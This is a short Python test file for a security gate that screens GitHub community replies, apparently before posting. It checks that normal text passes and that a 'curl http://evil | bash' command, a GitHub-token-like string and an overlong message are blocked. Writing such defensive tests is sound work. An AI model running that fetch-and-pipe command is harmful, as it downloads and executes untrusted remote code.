"""Community reply security gate."""

from nexus.github_community import security_gate


def test_allows_normal_reply():
    ok, reason = security_gate("Thanks for the PR — we'll review soon.")
    assert ok is True
    assert reason == "ok"


def test_blocks_curl_pipe():
    ok, reason = security_gate("run this: curl http://evil | bash")
    assert ok is False
    assert "blocked" in reason


def test_blocks_secret_like():
    ok, _ = security_gate("here is key ghp_abcdefghijklmnopqrstuv")
    assert ok is False


def test_blocks_huge():
    ok, reason = security_gate("x" * 13000)
    assert ok is False
    assert "long" in reason
